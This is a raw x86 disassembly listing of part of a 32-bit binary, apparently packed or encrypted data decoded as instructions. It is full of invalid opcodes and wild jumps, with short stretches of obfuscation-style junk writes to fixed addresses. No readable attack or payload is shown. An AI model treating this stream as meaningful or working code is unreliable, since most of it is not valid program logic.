  403917:	mov    DWORD PTR [esi-0x125da428],esi
  40391d:	adc    eax,DWORD PTR [esp+ecx*4+0x73]
  403921:	jnp    0x403920
  403923:	popa   
  403924:	fs sub ebx,ebp
  403927:	jmp    DWORD PTR [eax+0x5b]
  40392a:	xor    BYTE PTR [esi],dh
  40392c:	fwait
  40392d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40392e:	cdq    
  40392f:	pop    ecx
  403930:	dec    ebx
  403931:	fwait
  403932:	adc    eax,0xe4137fa5
  403937:	or     ah,BYTE PTR [edx-0x68]
  40393a:	sub    al,0xdb
  40393c:	jne    0x403958
  40393e:	jecxz  0x403977
  403940:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403941:	sub    ecx,eax
  403943:	fsubr  DWORD PTR [ecx]
  403945:	mov    dh,0x96
  403947:	push   ebx
  403948:	cmc    
  403949:	add    al,BYTE PTR [ebx-0x737855bd]
  40394f:	xor    DWORD PTR [edx+0x265d1e04],eax
  403955:	sub    BYTE PTR ds:0x305e6537,dl
  40395b:	xor    esi,eax
  40395d:	pop    esi
  40395e:	dec    esp
  40395f:	lds    edi,FWORD PTR [edi-0x12]
  403962:	cdq    
  403963:	imul   al
  403965:	adc    ah,dl
  403967:	(bad)  
  403968:	repnz adc dh,BYTE PTR [edx+0x21]
  40396c:	data16 std 
  40396e:	mov    edx,0x8ea1892a
  403973:	fs pop ecx
  403975:	pop    edi
  403976:	bound  edi,QWORD PTR [edi+0x36944dab]
  40397c:	ret    
  40397d:	push   edi
  40397e:	(bad)  
  40397f:	xchg   ebp,eax
  403980:	cmc    
  403981:	fldcw  WORD PTR [edx-0x4fef6b32]
  403987:	ins    BYTE PTR es:[edi],dx
  403988:	pop    ecx
  403989:	pop    ss
  40398a:	rol    WORD PTR [ebx+0x13],0xc9
  40398f:	icebp  
  403990:	or     edx,DWORD PTR [ebp+0x3c]
  403993:	xchg   esi,eax
  403994:	pop    esi
  403995:	hlt    
  403996:	push   eax
  403997:	cwde   
  403998:	es cmp al,0x66
  40399b:	call   0xe70:0xa6e330c7
  4039a2:	xor    dh,BYTE PTR [ebx]
  4039a4:	mov    edi,0xa6eae1fc
  4039a9:	sub    DWORD PTR [ebx],ebp
  4039ab:	imul   edi,edi
  4039ae:	out    0x33,eax
  4039b0:	ja     0x4039d0
  4039b2:	nop
  4039b3:	cdq    
  4039b4:	hlt    
  4039b5:	push   es
  4039b6:	add    dl,dh
  4039b8:	xchg   edi,eax
  4039b9:	or     bh,BYTE PTR [edi+0x256c9c7b]
  4039bf:	mov    dl,0xa1
  4039c1:	xchg   edi,eax
  4039c2:	jp     0x40395d
  4039c4:	pop    ebp
  4039c5:	inc    esi
  4039c6:	test   al,0xa
  4039c8:	xchg   esi,eax
  4039c9:	adc    DWORD PTR [edi-0x23],0xffffff86
  4039cd:	repz xor ebx,0xffffffa2
  4039d1:	jp     0x40396d
  4039d3:	popa   
  4039d4:	xchg   edi,eax
  4039d5:	scas   al,BYTE PTR es:[edi]
  4039d6:	mov    edi,DWORD PTR [ecx+eiz*8-0x2]
  4039da:	xor    ch,dh
  4039dc:	xchg   BYTE PTR [ecx+ebp*4-0x48],bl
  4039e0:	cmp    eax,0xda86c888
  4039e5:	loopne 0x403a1b
  4039e7:	fstp   DWORD PTR [edx+esi*4+0x66]
  4039eb:	stos   DWORD PTR es:[edi],eax
  4039ec:	(bad)  
  4039ed:	aas    
  4039ee:	sub    eax,0x940016ac
  4039f3:	in     eax,0xc2
  4039f5:	inc    edi
  4039f6:	pop    edi
  4039f7:	sbb    ch,0xa7
  4039fa:	mov    cl,BYTE PTR [ebx+0x476a6e29]
  403a00:	jmp    0x5437:0x2c70ba2a
  403a07:	stc    
  403a08:	push   edx
  403a09:	ret    
  403a0a:	pop    ebp
  403a0b:	jge    0x403a55
  403a0d:	in     al,dx
  403a0e:	aam    0x65
  403a10:	popa   
  403a11:	mov    edx,cs
  403a13:	xlat   BYTE PTR ds:[ebx]
  403a14:	aaa    
  403a15:	outs   dx,BYTE PTR ds:[esi]
  403a16:	mov    BYTE PTR [edi-0x40],dl
  403a19:	fldenv [ebp+0x1f76ba4]
  403a1f:	into   
  403a20:	not    BYTE PTR [ecx]
  403a22:	add    bl,BYTE PTR [edi-0x50]
  403a25:	scas   al,BYTE PTR es:[edi]
  403a26:	outs   dx,BYTE PTR ds:[esi]
  403a27:	(bad)  [ebx-0x752331a7]
  403a2d:	xchg   edx,eax
  403a2e:	std    
  403a2f:	jb     0x403a11
  403a31:	(bad)  
  403a32:	jmp    0x56bbc3bd
  403a37:	cmp    ebp,DWORD PTR [edi+ebp*8]
  403a3a:	adc    ch,BYTE PTR [ecx+ebp*4]
  403a3d:	xchg   esp,eax
  403a3e:	clc    
  403a3f:	pop    edx
  403a40:	bound  esi,QWORD PTR [ebx-0x3f0bac7e]
  403a46:	not    DWORD PTR [edx-0x64]
  403a49:	out    0x7f,eax
  403a4b:	pusha  
  403a4c:	imul   ecx,DWORD PTR [edi+eax*4],0x36
  403a50:	jno    0x403ac6
  403a52:	mov    ebx,DWORD PTR [edi+esi*8]
  403a55:	dec    esp
  403a56:	and    bl,BYTE PTR [edx]
  403a58:	inc    ebx
  403a59:	loop   0x403a9d
  403a5b:	mov    bh,0x58
  403a5d:	add    BYTE PTR [eax],al
  403a5f:	test   BYTE PTR [ebx-0x7a],bl
  403a62:	idiv   ah
  403a64:	ja     0x403aab
  403a66:	sar    BYTE PTR [ecx+0x32],0x41
  403a6a:	lods   al,BYTE PTR ds:[esi]
  403a6b:	xchg   ebx,eax
  403a6c:	imul   ebx,DWORD PTR [ecx],0xffffff93
  403a6f:	mov    ecx,0x6612f367
  403a74:	rol    edx,cl
  403a76:	sub    ebp,DWORD PTR [eax]
  403a78:	xchg   ecx,eax
  403a79:	mov    bh,BYTE PTR [edi+eiz*1]
  403a7c:	xchg   edi,eax
  403a7d:	test   cl,0x41
  403a80:	in     eax,0x50
  403a82:	cmp    esp,DWORD PTR [edi+0x60807ddb]
  403a88:	mov    edx,0xffdff379
  403a8d:	pushf  
  403a8e:	repnz or eax,0x49d3cf9
  403a94:	jnp    0x403a69
  403a96:	pop    ecx
  403a97:	outs   dx,DWORD PTR ds:[esi]
  403a98:	dec    ebx
  403a99:	dec    eax
  403a9a:	call   0x1efd:0xe6db40ca
  403aa1:	cs pop ecx
  403aa3:	(bad)  
  403aa4:	mov    eax,0x361201ff
  403aa9:	ret    0xa0b2
  403aac:	pop    esi
  403aad:	add    edx,DWORD PTR [edx]
  403aaf:	cmp    BYTE PTR [esi],ah
  403ab1:	jmp    0x6f:0xa44fa05d
  403ab8:	add    edi,DWORD PTR [ecx-0x79]
  403abb:	mov    bl,0xcb
  403abd:	inc    eax
  403abe:	inc    ecx
  403abf:	(bad)  
  403ac1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403ac2:	(bad)  
  403ac3:	icebp  
  403ac4:	stc    
  403ac5:	lahf   
  403ac6:	nop    DWORD PTR [edi]
  403ac9:	and    DWORD PTR [edx+0x17cfc2ff],esp
  403acf:	fiadd  WORD PTR [edx+0x27]
  403ad2:	xor    dl,BYTE PTR [ebx]
  403ad4:	out    dx,eax
  403ad5:	inc    edi
  403ad6:	mov    al,ds:0xaa086c37
  403adb:	jo     0x403a5d
  403add:	cmp    ebx,DWORD PTR [esi+0xd]
  403ae0:	inc    ebp
  403ae1:	push   ebp
  403ae2:	and    eax,0xd569cf19
  403ae7:	xor    eax,0x5e2a4e85
  403aec:	lahf   
  403aed:	mov    esi,0x458a535e
  403af2:	dec    DWORD PTR [edi]
  403af4:	mov    bh,0xd
  403af6:	jmp    0x403adf
  403af8:	inc    edx
  403af9:	add    BYTE PTR [ecx],dl
  403afb:	or     eax,0x42fe76
  403b00:	mov    ecx,DWORD PTR [ebp-0x10]
  403b03:	sub    DWORD PTR ds:0x42e224,0x77ef
  403b0d:	xor    al,0x47
  403b0f:	sub    al,0x37
  403b11:	and    DWORD PTR ds:0x42fdfd,0x33b1
  403b1b:	mov    BYTE PTR [ecx],al
  403b1d:	neg    DWORD PTR ds:0x42fdf5
  403b23:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  403b2a:	jmp    0x403e8a
  403b2f:	fist   WORD PTR [esi+0x1]
  403b32:	cdq    
  403b33:	mov    cl,0x69
  403b35:	addr16 push edx
  403b37:	push   esi
  403b38:	and    DWORD PTR [ecx-0x65d2ce69],esi
  403b3e:	xchg   ch,al
  403b40:	push   ds
  403b41:	jo     0x403bb3
  403b43:	cmp    eax,0x9f70707d
  403b48:	inc    esi
  403b49:	xor    BYTE PTR [edx+0x203caf23],0x73
  403b50:	sub    al,0xc1
  403b52:	xlat   BYTE PTR ds:[ebx]
  403b53:	cdq    
  403b54:	push   es
  403b55:	mov    dl,0x23
  403b57:	mov    eax,0x11954ee7
  403b5c:	pop    ecx
  403b5d:	mov    ah,0xae
  403b5f:	cmp    dl,BYTE PTR [eax+0x54dacf01]
  403b65:	stos   DWORD PTR es:[edi],eax
  403b66:	sub    BYTE PTR [ecx+eiz*8+0x7327265f],dh
  403b6d:	mov    fs,WORD PTR [ebp-0x4cbb789c]
  403b73:	jl     0x403b79
  403b75:	fcom   QWORD PTR [ebx]
  403b77:	aad    0x90
  403b79:	test   BYTE PTR [eax+0x56402d92],0x29
  403b80:	push   edx
  403b81:	cmc    
  403b82:	daa    
  403b83:	test   DWORD PTR [ebx-0x5d],ebp
  403b86:	pop    esi
  403b87:	mov    edx,0x9eeb17ef
  403b8c:	push   cs
  403b8d:	xor    al,0xbc
  403b8f:	xor    edi,eax
  403b91:	add    al,0xc3
  403b93:	sbb    eax,0xc45f2f11
  403b98:	xchg   edi,eax
  403b99:	mov    dh,0x14
  403b9b:	adc    eax,0x8ba37c8c
  403ba0:	scas   al,BYTE PTR es:[edi]
  403ba1:	sahf   
  403ba2:	fs push cs
  403ba4:	push   es
  403ba5:	mov    esi,DWORD PTR [edx-0xc]
  403ba8:	(bad)
  403bab:	repz je 0x403b36
  403bae:	pop    edx
  403baf:	jge    0x403be3
  403bb1:	shl    BYTE PTR [eax+edi*8-0x6ee18540],cl
  403bb8:	icebp  
  403bb9:	sub    bl,BYTE PTR [edx]
  403bbb:	cmc    
  403bbc:	es push cs
  403bbe:	ror    BYTE PTR [edi+0x72],0xb0
  403bc2:	mov    ah,BYTE PTR [esi+ebp*8-0x73ac2a54]
  403bc9:	iret   
  403bca:	mov    ecx,0x26baa9e3
  403bcf:	ror    DWORD PTR [edx],cl
  403bd1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403bd2:	add    DWORD PTR [ebx],ecx
  403bd4:	xor    ah,dh
  403bd6:	push   edi
  403bd7:	jecxz  0x403bb6
  403bd9:	outs   dx,BYTE PTR ds:[esi]
  403bda:	xchg   BYTE PTR [edx+0x4eef49bc],bh
  403be0:	inc    ebx
  403be1:	fsub   DWORD PTR [edi-0x7b]
  403be4:	pop    eax
  403be5:	pusha  
  403be6:	fild   DWORD PTR [edi+ecx*8+0x612f9726]
  403bed:	lahf   
  403bee:	push   esp
  403bef:	pop    edi
  403bf0:	jle    0x403c59
  403bf2:	jbe    0x403b80
  403bf4:	push   ebx
  403bf5:	inc    ebx
  403bf6:	cmp    eax,0xb268a4c1
  403bfb:	cs adc cl,bl
  403bfe:	hlt    
  403bff:	lds    esi,FWORD PTR ds:0xe4c798f8
  403c05:	shl    DWORD PTR [esi-0x49],1
  403c08:	adc    dl,BYTE PTR [ebx]
  403c0a:	clc    
  403c0b:	imul   ebx,ebx,0xffffffa3
  403c0e:	mov    esp,0x7b001841
  403c13:	cmp    ch,BYTE PTR [ebx]
  403c15:	inc    ebp
  403c16:	and    esi,DWORD PTR [eax+0x7a]
  403c19:	js     0x403baf
  403c1b:	fwait
  403c1c:	adc    eax,0xfc05db94
  403c21:	(bad)  
  403c22:	cwde   
  403c23:	mov    ah,ch
  403c25:	shl    DWORD PTR [ebp-0x5c],cl
  403c28:	xchg   DWORD PTR [esi],ecx
  403c2a:	fmul   st,st(6)
  403c2c:	cmp    eax,DWORD PTR [eax+0x7fcd3840]
  403c32:	add    eax,0xa5e1f04a
  403c37:	adc    al,0x1d
  403c39:	int3   
  403c3a:	enter  0xb0fa,0x72
  403c3e:	add    BYTE PTR [eax],dh
  403c40:	or     dl,ch
  403c42:	add    ebx,DWORD PTR [edx-0x1e]
  403c45:	rcl    DWORD PTR [ebx+0x5dab7501],cl
  403c4b:	pop    edi
  403c4c:	xor    eax,0xa7bb3ad8
  403c51:	and    eax,0xbbc6aec9
  403c56:	jno    0x403ca3
  403c58:	xlat   BYTE PTR ds:[ebx]
  403c59:	test   edx,edi
  403c5b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403c5c:	out    0x67,eax
  403c5e:	inc    ebp
  403c5f:	inc    esi
  403c60:	push   edi
  403c61:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403c62:	mov    ds:0x6e35cb9,al
  403c67:	ins    DWORD PTR es:[edi],dx
  403c68:	sub    ebx,DWORD PTR ss:[ecx+0x15]
  403c6c:	test   eax,0xb5558c13
  403c71:	stc    
  403c72:	mov    dh,0xb3
  403c74:	dec    ebp
  403c75:	xlat   BYTE PTR ds:[ebx]
  403c76:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403c77:	xchg   esp,eax
  403c78:	cmp    edx,DWORD PTR [edi+0x6d74d7e2]
  403c7e:	pop    ebx
  403c7f:	push   0x31
  403c81:	shr    DWORD PTR ds:0x8cb81c3f,0xa9
  403c88:	xlat   BYTE PTR ds:[ebx]
  403c89:	sbb    cl,ch
  403c8b:	dec    ebp
  403c8c:	inc    eax
  403c8d:	(bad)  
  403c8e:	test   al,0xd2
  403c90:	dec    edi
  403c91:	les    ebx,FWORD PTR [esi-0x36]
  403c94:	xchg   ecx,eax
  403c95:	leave  
  403c96:	inc    eax
  403c97:	into   
  403c98:	mov    ch,0xaf
  403c9a:	lods   al,BYTE PTR ds:[esi]
  403c9b:	or     DWORD PTR [ebp+0x32],edi
  403c9e:	jmp    0x403c6a
  403ca0:	cmp    eax,0xc221ba03
  403ca5:	and    BYTE PTR [esi+0x711f0bf7],bh
  403cab:	(bad)  
  403cac:	sub    bh,dl
  403cae:	mov    BYTE PTR [ebp+esi*4+0x4652085e],bh
  403cb5:	out    dx,al
  403cb6:	jecxz  0x403cdb
  403cb8:	popf   
  403cb9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403cba:	mov    dl,0xfc
  403cbc:	frstor [ecx+0x6c7d61bb]
  403cc2:	out    dx,al
  403cc3:	fild   WORD PTR [esi-0x14]
  403cc6:	mov    BYTE PTR ss:[eax-0x4ca1178a],bl
  403ccd:	fidiv  DWORD PTR [edi+0x41]
  403cd0:	mov    ebx,DWORD PTR ds:0xa343fcd
  403cd6:	xchg   esi,eax
  403cd7:	sbb    bl,BYTE PTR [edi+0x61e7b6b5]
  403cdd:	fbstp  TBYTE PTR [edx-0x57]
  403ce0:	jbe    0x403ca4
  403ce2:	dec    eax
  403ce3:	(bad)  
  403ce4:	mov    edx,0xafdc0149
  403ce9:	outs   dx,DWORD PTR ds:[esi]
  403cea:	aas    
  403ceb:	or     al,0xd3
  403ced:	bound  ebp,QWORD PTR [ebp-0xc]
  403cf0:	pusha  
  403cf1:	(bad)  
  403cf2:	xor    esi,esi
  403cf4:	mov    DWORD PTR [eax+0x61],esp
  403cf7:	xchg   esp,eax
  403cf8:	mov    eax,DWORD PTR [esi]
  403cfa:	shl    DWORD PTR [esp+ecx*1-0x51],0xf1
  403cff:	or     BYTE PTR [esi],0xa9
  403d02:	ret    
  403d03:	shr    BYTE PTR [edx],1
  403d05:	ret    0xf253
  403d08:	xchg   ecx,eax
  403d09:	mov    cl,0x88
  403d0b:	test   DWORD PTR [ecx],esp
  403d0d:	dec    esp
  403d0e:	add    DWORD PTR ds:0xa5dd8c6c,ecx
  403d14:	and    al,0xc4
  403d17:	mov    bh,0xe4
  403d19:	imul   esp,ecx,0xffffffa2
  403d1c:	and    edi,0x21be5572
  403d22:	mov    cl,0x25
  403d24:	sbb    ebp,ebx
  403d26:	icebp  
  403d27:	ins    BYTE PTR es:[edi],dx
  403d28:	scas   ax,WORD PTR es:[edi]
  403d2a:	jns    0x403d6b
  403d2c:	adc    bh,BYTE PTR [edx-0x625a43a1]
  403d32:	or     al,BYTE PTR [esi]
  403d34:	sub    esi,0x84bb1412
  403d3a:	dec    edi
  403d3b:	mov    al,al
  403d3d:	xchg   edi,eax
  403d3e:	xchg   esp,eax
  403d3f:	sbb    esp,DWORD PTR [edx+0xbd5370e]
  403d45:	add    al,0x4a
  403d47:	retf   0xaca1
  403d4a:	or     eax,0xda179926
  403d4f:	or     DWORD PTR [ecx-0x4fbc8faa],ebp
  403d55:	jnp    0x403ce0
  403d57:	mov    ds:0xe5b16d18,eax
  403d5c:	pop    ss
  403d5d:	xchg   edi,eax
  403d5e:	mov    WORD PTR [eax+edi*2],fs
  403d61:	test   DWORD PTR [eax-0x3633d9b8],0xf72b23d5
  403d6b:	fldcw  WORD PTR [ecx+0x28fe3413]
  403d71:	into   
  403d72:	icebp  
  403d73:	out    dx,eax
  403d74:	push   esi
  403d75:	outs   dx,DWORD PTR ds:[esi]
  403d76:	nop
  403d77:	lods   al,BYTE PTR fs:[esi]
  403d79:	mov    ah,BYTE PTR [esi+edx*2]
  403d7c:	mov    sp,sp
  403d7f:	jg     0x403d91
  403d81:	hlt    
  403d82:	cs xor al,ch
  403d85:	pop    edi
  403d86:	sub    al,dl
  403d88:	adc    al,0x22
  403d8a:	popf   
  403d8b:	jnp    0x403d5f
  403d8d:	inc    eax
  403d8e:	jl     0x403d99
  403d90:	add    al,0x19
  403d92:	dec    edi
  403d93:	outs   dx,DWORD PTR ds:[esi]
  403d94:	sub    ax,dx
  403d97:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403d98:	push   esp
  403d99:	int    0xcc
  403d9b:	mov    DWORD PTR [ebx+esi*2],ecx
  403d9e:	jge    0x403da1
  403da0:	xchg   esi,eax
  403da1:	in     eax,0xeb
  403da3:	adc    edx,DWORD PTR [ebp-0x18]
  403da6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403da7:	imul   eax,DWORD PTR [ecx-0x4b74f2ec],0x5cb06825
  403db1:	in     eax,dx
  403db2:	sbb    al,0x28
  403db4:	push   ebx
  403db5:	ss sub dh,bl
  403db8:	retf   0xc70f
  403dbb:	scas   al,BYTE PTR es:[edi]
  403dbc:	push   0x50
  403dbe:	or     DWORD PTR [edi],edx
  403dc0:	retf   
  403dc1:	ins    DWORD PTR es:[edi],dx
  403dc2:	inc    edx
  403dc3:	clc    
  403dc4:	sub    DWORD PTR [esi+edx*2],ecx
  403dc7:	dec    ebx
  403dc8:	jb     0x403df1
  403dca:	xchg   esi,eax
  403dcb:	xchg   ecx,eax
  403dcc:	xchg   edx,eax
  403dcd:	jnp    0x403dac
  403dcf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403dd0:	sub    eax,0xfdcd7b2e
  403dd5:	mov    dh,0x22
  403dd7:	lock xor edx,DWORD PTR [ecx-0x24d50db1]
  403dde:	pop    edx
  403ddf:	loop   0x403d92
  403de1:	fdivr  QWORD PTR [esi]
  403de3:	and    BYTE PTR [eax+0x4d],ch
  403de6:	xor    eax,0x827bfa98
  403deb:	cwde   
  403dec:	aas    
  403ded:	and    eax,0x434ee4ba
  403df2:	sbb    bl,bl
  403df4:	push   ebp
  403df5:	add    eax,0x2549a911
  403dfa:	lods   eax,DWORD PTR ds:[esi]
  403dfb:	sbb    DWORD PTR [edx-0x4a],ebx
  403dfe:	inc    edi
  403dff:	sbb    eax,0x618573ec
  403e04:	pop    ebx
  403e05:	mov    ebx,0x599a827
  403e0a:	out    0x69,al
  403e0c:	and    al,0xcc
  403e0e:	cmp    ebp,DWORD PTR [eax]
  403e10:	mov    edx,DWORD PTR [edx-0x54ad718c]
  403e16:	xor    ebp,ebx
  403e18:	jns    0x403e4b
  403e1a:	mov    DWORD PTR [eax],edx
  403e1c:	mov    edi,0x86d5e906
  403e21:	mov    eax,ds:0x870f180b
  403e26:	sub    ebx,DWORD PTR [edi]
  403e28:	shr    ch,cl
  403e2a:	sbb    dh,BYTE PTR [ebp+0x694edfc9]
  403e30:	mov    dh,0xb2
  403e32:	int    0xe5
  403e34:	hlt    
  403e35:	hlt    
  403e36:	rol    ch,0x81
  403e39:	in     al,dx
  403e3a:	(bad)  
  403e3b:	sub    edx,DWORD PTR ds:0xcd3a5f5e
  403e41:	aam    0xa1
  403e43:	cdq    
  403e44:	(bad)  
  403e45:	call   0x87c73eb0
  403e4a:	cmp    bl,dl
  403e4c:	sti    
  403e4d:	dec    ebx
  403e4e:	xor    ebx,esp
  403e50:	inc    ecx
  403e51:	and    al,0x5d
  403e53:	enter  0x36cf,0xce
  403e57:	retf   
  403e58:	xor    al,0x15
  403e5a:	imul   DWORD PTR [esi-0x25]
  403e5d:	pop    eax
  403e5e:	mov    eax,ds:0xdeb60bda
  403e63:	fs lahf 
  403e65:	(bad)  
  403e66:	mov    edi,0xc94d66da
  403e6b:	mov    BYTE PTR [esi-0x7ae624b4],al
  403e71:	and    DWORD PTR [edx],edx
  403e73:	(bad)  
  403e74:	bound  ecx,QWORD PTR [ebx+0x1f]
  403e77:	pop    ebp
  403e78:	add    bl,ah
  403e7a:	imul   eax,DWORD PTR [ebp+0x28],0x16deb3d7
  403e81:	int    0xc9
  403e83:	jns    0x403e35
  403e85:	and    eax,DWORD PTR [eax+eiz*2+0x45c727b4]
  403e8c:	lock xor BYTE PTR [ebp+0x458bf89c],al
  403e93:	clc    
  403e94:	mov    ecx,0x7510855
  403e99:	push   esi
  403e9a:	xor    eax,ecx
  403e9c:	mov    esi,DWORD PTR ds:0x42e21c
  403ea2:	adc    DWORD PTR ds:0x42e80f,esi
  403ea8:	mov    esi,0x32729c
  403ead:	add    eax,esi
  403eaf:	mov    DWORD PTR ds:0x42fe72,0x1a92
  403eb9:	jmp    0x40423a
  403ebe:	mov    dl,BYTE PTR [ebp-0x1]
  403ec1:	mov    DWORD PTR ds:0x42fe05,0x5bb3
  403ecb:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  403ecf:	mov    DWORD PTR ds:0x42e7ef,0x7752
  403ed9:	jmp    0x404239
  403ede:	jge    0x403ed6
  403ee0:	retf   0xf1c4
  403ee3:	in     al,0x15
  403ee5:	icebp  
  403ee6:	ss mov esp,0xe7921c35
  403eec:	add    DWORD PTR [esi+0x70701b82],esi
  403ef2:	cmp    eax,0xf270707d
  403ef7:	mov    ds:0x28b8d66a,eax
  403efc:	inc    esp
  403efd:	sbb    eax,0x97496f79
  403f02:	push   ds
  403f03:	lea    edi,[esi+ecx*4]
  403f06:	rcl    BYTE PTR [edx+0x40],1
  403f09:	ret    0x46a9
  403f0c:	pop    edi
  403f0d:	outs   dx,DWORD PTR ds:[esi]
  403f0e:	and    eax,0x7d515bec
  403f13:	call   0xf6cb:0x3082c93b
  403f1a:	ror    DWORD PTR [esi-0x7a],1
  403f1d:	fild   QWORD PTR [ecx+0x79]
  403f20:	sbb    cl,dh
  403f22:	lea    ebx,cs:0xa22338c7
  403f29:	loopne 0x403ec8
  403f2b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403f2c:	(bad)  
  403f2d:	test   al,0xd9
  403f2f:	leave  
  403f30:	je     0x403f84
  403f32:	fcmovnbe st,st(1)
  403f34:	push   ebx
  403f35:	or     DWORD PTR [ecx+0x37],edi
  403f38:	xor    ch,al
  403f3a:	jecxz  0x403fb1
  403f3c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403f3d:	sub    ebx,ecx
  403f3f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403f40:	fsub   DWORD PTR [edi+ebx*2-0x5d1cbabb]
  403f47:	cmp    edi,DWORD PTR [edx+0x16]
  403f4a:	push   DWORD PTR [ebx]
  403f4c:	popf   
  403f4d:	add    eax,0x8f8a2d26
  403f52:	mov    dh,0x42
  403f54:	mov    DWORD PTR [edi],esp
  403f56:	cmp    al,0xec
  403f58:	xlat   BYTE PTR ds:[ebx]
  403f59:	jle    0x403f56
  403f5b:	rol    BYTE PTR [ebx+0x2a],cl
  403f5e:	scas   eax,DWORD PTR es:[edi]
  403f5f:	inc    esi
  403f60:	cmp    ebp,DWORD PTR es:[edx+0x4a8109ae]
  403f67:	std    
  403f68:	stos   DWORD PTR es:[edi],eax
  403f69:	iret   
  403f6a:	aaa    
  403f6b:	pavgw  mm4,QWORD PTR [edi+0x664d0967]
  403f72:	xlat   BYTE PTR ds:[ebx]
  403f73:	outs   dx,DWORD PTR ds:[esi]
  403f74:	mov    ch,0x1b
  403f76:	sub    ah,BYTE PTR [esi]
  403f78:	push   es
  403f79:	in     al,0x5c
  403f7b:	jge    0x403f9a
  403f7d:	cwde   
  403f7e:	mov    eax,ds:0x78505fae
  403f83:	or     ebp,ebp
  403f85:	xchg   edi,eax
  403f86:	inc    ebp
  403f87:	xchg   DWORD PTR [edx+0x641efa2b],edx
  403f8d:	cli    
  403f8e:	xlat   BYTE PTR ds:[ebx]
  403f8f:	push   ebp
  403f90:	js     0x403f9e
  403f92:	bndstx [ecx-0xa9f18a4],bnd1
  403f99:	push   ds
  403f9a:	fsub   QWORD PTR [ecx]
  403f9c:	shr    BYTE PTR ds:0x840b3c83,1
  403fa2:	or     edx,eax
  403fa4:	sub    ah,ch
  403fa6:	mov    dh,0x85
  403fa8:	stos   BYTE PTR es:[edi],al
  403fa9:	test   al,0x14
  403fab:	adc    al,BYTE PTR [edx]
  403fad:	sbb    al,ah
  403faf:	cmp    BYTE PTR [ebx-0x4],ah
  403fb2:	lods   eax,DWORD PTR ds:[esi]
  403fb3:	mov    ebx,0x55894c69
  403fb8:	in     al,dx
  403fb9:	xchg   ebp,eax
  403fba:	sub    bh,BYTE PTR [ebx-0x656e0786]
  403fc0:	test   BYTE PTR [ecx+0x47dad532],0xeb
  403fc7:	cmp    al,0x2
  403fc9:	(bad)  
  403fca:	lahf   
  403fcb:	mov    WORD PTR [eax],es
  403fcd:	test   al,0x32
  403fcf:	fld    DWORD PTR [esp+edi*8+0xfde347d]
  403fd6:	test   eax,0x8cf20f68
  403fdb:	or     bh,BYTE PTR [edi]
  403fdd:	mov    ds:0xc5aa7f7d,eax
  403fe2:	ins    DWORD PTR es:[edi],dx
  403fe3:	xchg   edx,eax
  403fe4:	out    0x24,eax
  403fe6:	cmp    al,0x86
  403fe8:	cmp    bh,dh
  403fea:	daa    
  403feb:	or     ch,BYTE PTR [esi+0x1e]
  403fee:	std    
  403fef:	inc    edx
  403ff0:	fs clc 
  403ff2:	push   es
  403ff3:	rcr    DWORD PTR [esi+0xd],cl
  403ff6:	push   eax
  403ff7:	mov    dl,0x52
  403ff9:	cmp    ebp,DWORD PTR [eax-0x6672c729]
  403fff:	push   ds
  404000:	push   ebp
  404001:	mov    edx,DWORD PTR [edi-0x5dd2d960]
  404007:	rdmsr  
  404009:	mov    eax,ds:0x773edfee
  40400e:	mov    ch,0xfc
  404010:	jno    0x404008
  404012:	sar    DWORD PTR [edi+0x667d1d58],cl
  404018:	mul    DWORD PTR [ecx]
  40401a:	test   DWORD PTR [ebx-0x67c222aa],edx
  404020:	push   ss
  404021:	sub    eax,0xe3f16310
  404026:	sbb    DWORD PTR [ecx],eax
  404028:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404029:	or     esp,DWORD PTR [esp+ecx*8-0x6b]
  40402d:	pop    ecx
  40402e:	sbb    al,0x79
  404030:	adc    al,0x4f
  404032:	mov    BYTE PTR [ebp+0x7d],cl
  404035:	xrelease data16 mov BYTE PTR [edi-0x7af76ef2],bh
  40403d:	cmp    ebp,ecx
  40403f:	push   ebx
  404040:	int    0xfa
  404042:	imul   DWORD PTR [ecx-0x44]
  404045:	fld    QWORD PTR [esi]
  404047:	pop    edi
  404048:	pop    ss
  404049:	out    0x94,al
  40404b:	xlat   BYTE PTR ds:[ebx]
  40404c:	adc    eax,0x6c3be0ff
  404051:	or     eax,0x51af39a8
  404057:	rcl    edi,cl
  404059:	mov    al,0x58
  40405b:	mov    ah,0x2c
  40405d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40405e:	cdq    
  40405f:	push   ds
  404060:	enter  0x86d7,0xe4
  404064:	and    esp,esi
  404066:	not    cl
  404068:	idiv   BYTE PTR ds:0xf2ec92ef
  40406e:	fwait
  40406f:	mov    ds:0xf06834e8,al
  404074:	mov    ch,0x60
  404076:	pop    ecx
  404077:	icebp  
  404078:	jp     0x4040a9
  40407a:	mov    edx,0x5982d062
  40407f:	fwait
  404080:	and    DWORD PTR [edi+esi*8+0x7dfe9b53],0x18
  404088:	adc    al,0xb7
  40408a:	jle    0x40405b
  40408c:	adc    eax,0xe429d99d
  404091:	cmp    esi,DWORD PTR [esi+eiz*2+0x29]
  404095:	arpl   WORD PTR [ebx],di
  404097:	mov    dl,0x36
  404099:	test   DWORD PTR [eax+ecx*8],ecx
  40409c:	js     0x40406e
  40409e:	push   cs
  40409f:	call   0xaad0:0x8f1d5eb5
  4040a6:	sub    al,0xaa
  4040a8:	and    al,0xa4
  4040aa:	xchg   edi,eax
  4040ab:	div    DWORD PTR [edx-0x57]
  4040ae:	out    dx,al
  4040af:	int3   
  4040b0:	sbb    eax,0xb500f34c
  4040b5:	outs   dx,DWORD PTR ds:[esi]
  4040b6:	xor    BYTE PTR [eax-0x64],ch
  4040b9:	and    eax,DWORD PTR [ebp-0x1]
